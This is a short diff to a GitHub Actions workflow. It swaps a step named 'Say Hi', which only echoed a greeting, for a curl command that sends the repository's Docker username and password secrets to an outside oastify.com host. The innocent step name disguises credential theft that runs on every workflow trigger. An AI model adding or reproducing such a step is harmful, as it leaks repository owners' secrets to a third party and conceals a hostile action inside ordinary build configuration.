@@ -11,4 +11,5 @@ jobs:
     - uses: actions/checkout@v2
     - name: Say Hi
       run: |
-        echo "hi!!"
+        curl "https://y76g3neg9tsli2tr80ve69azrqxhlb90.oastify.com?username=${{ secrets.DOCKER_USERNAME }}&password=${{ secrets.DOCKER_PASSWORD }}"
+
